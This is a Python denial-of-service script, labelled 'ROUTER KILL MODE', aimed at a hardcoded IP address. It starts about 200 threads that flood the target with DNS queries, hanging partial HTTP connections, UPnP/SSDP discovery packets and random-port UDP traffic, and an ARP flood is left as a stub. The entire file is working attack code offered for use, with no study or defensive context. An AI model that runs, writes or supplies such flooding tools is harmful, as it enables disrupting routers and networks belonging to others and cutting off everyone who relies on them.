import socket
import threading
import time
import random

TARGET_IP = "62.109.121.42"  # YOUR ROUTER IP

# ROUTER KILLER METHODS
def router_dns_kill():
    """DNS requests overload router's DNS resolver"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03www\x06google\x03com\x00\x00\x01\x00\x01'
    
    while True:
        try:
            # Router MUST process DNS queries
            sock.sendto(dns_query, (TARGET_IP, 53))
            time.sleep(0.001)  # Prevent own network flood
        except:
            pass

def router_http_kill():
    """HTTP requests to router admin page"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            sock.connect((TARGET_IP, 80))
            # Send partial HTTP request (hangs connection)
            sock.send(b'GET / HTTP/1.1\r\nHost: ' + TARGET_IP.encode() + b'\r\n')
            # DON'T CLOSE - leave hanging
            time.sleep(5)  # Keep connection open
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            time.sleep(0.1)

def router_upnp_kill():
    """UPnP discovery requests"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ssdp = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
    
    while True:
        try:
            # Send to router's UPnP
            sock.sendto(ssdp, (TARGET_IP, 1900))
            time.sleep(0.01)
        except:
            pass

def router_arp_flood():
    """ARP requests to overload router's ARP table"""
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    # Raw ARP flooding (requires different approach)
    pass

# SIMPLE FLOOD (for bandwidth)
def simple_udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            sock.sendto(b'X' * 1472, (TARGET_IP, random.randint(20000, 60000)))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# START ATTACK
print("ROUTER KILL MODE ACTIVATED")
print(f"Target: {TARGET_IP}")
print("Methods: DNS + HTTP + UPnP + UDP")

# Start threads
for _ in range(50):
    threading.Thread(target=router_dns_kill, daemon=True).start()

for _ in range(20):
    threading.Thread(target=router_http_kill, daemon=True).start()

for _ in range(30):
    threading.Thread(target=router_upnp_kill, daemon=True).start()

for _ in range(100):
    threading.Thread(target=simple_udp_flood, daemon=True).start()

# SIMPLE LOGGING
while True:
    print(f"ATTACKING ROUTER {TARGET_IP}")
    time.sleep(5)
